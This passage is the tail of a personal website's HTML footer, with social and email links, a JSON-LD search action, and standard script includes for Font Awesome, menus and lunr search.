link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>